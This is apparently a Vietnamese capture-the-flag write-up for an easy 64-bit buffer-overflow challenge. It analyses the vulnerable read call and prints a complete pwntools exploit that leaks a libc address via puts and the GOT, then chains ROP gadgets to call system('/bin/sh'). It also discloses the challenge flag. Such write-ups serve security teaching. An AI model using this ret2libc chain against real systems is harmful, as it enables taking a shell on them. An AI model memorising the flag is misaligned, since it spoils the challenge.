# [CTF] - [basic_rop_x64]

> **Meta Info**
> - **Author:** Hoan (KMA)
> - **Difficulty:** Easy
> - **Flag:** `DH{6311151d71a102eb27195bceb61097c15cd2bcd9fd117fc66293e8c780ae104e}`

---

## PHẦN 1: PHÂN TÍCH BÀI (Challenge Analysis)

### 1. Thông tin chung & Checksec
- **File nhận được:** `basic_rop_x64.c`, `basic_rop_x64` ,`Dockerfile` , `flag` , `libc.so.6`
- **Kết quả checksec:**
  ```bash
      Arch:     amd64-64-little
      RELRO:    Partial RELRO
      Stack:    No Canary found
      NX:       NX enabled
      PIE:      N0 PIE

### 2. Phân tích tĩnh : 
- Đây là bài chỉ dẫn cách khai thác ROP điển hình : 
```
char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));
```
- Ta có thể thấy lỗi `BOF` ở `read` , từ đó có thể `overflow` `RIP` , vì địa chỉ tĩnh có thể dùng `ROP` để hiệu quả hơn , ngoài ra chương trình cũng cho file`libc` khả năng sẽ dùng để lấy `shell` 

## PHẦN 2: HƯỚNG VÀ CÁCH GIẢI :
---
### 1. Ý tưởng :
- Đầu tiên ta cần leak được địa chỉ của `libc` , bằng cách khi đã `overflow` được `RIP` , ta `pop rdi` = địa chỉ `GOT` của `read` , sau đó gọi `puts@ptl` để thực hiện với tham số đầu là `read` từ đó có thể in ra được địa chỉ libc bên trong của `read` -> tính được `libc_base` 
- Khi đã có `libc_base` , ta bắt chương trình chạy lại lần nữa để lần `overflow` lần sau ta `pop rdi` là chuỗi `/bin/sh` và gọi `system` trong libc

### 2. Kịch bản tấn công : 
```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./basic_rop_x64_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

p = process(exe.path)

gdb.attach(p, gdbscript='''
    b *main+67
    c
''')

## leak libc_adr : 
pop_rdi = 0x0000000000400883
pop_rsi = 0x0000000000400881
main = 0x00000000004007ba
payload = b'A' * 72
payload += p64(pop_rdi) + p64(exe.got['read'])
payload += p64(exe.sym['puts'])
payload += p64(main)

p.send(payload)

p.recvuntil(b'A'*0x40)
raw = p.recvuntil(b'\n',drop = True)
leak_raw = raw.ljust(8, b'\x00')
libc_leak = u64(leak_raw)

libc.address = libc_leak - 0x114980

log.info(f'libc_leak = {hex(libc_leak)}')
log.info(f'libc_adr = {hex(libc.address)}')


## Get_shell 


ret = 0x0000000000400819
payload = b'A' * 72
payload += p64(ret)
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(libc.sym['system'])
input()
p.send(payload)

p.interactive()
```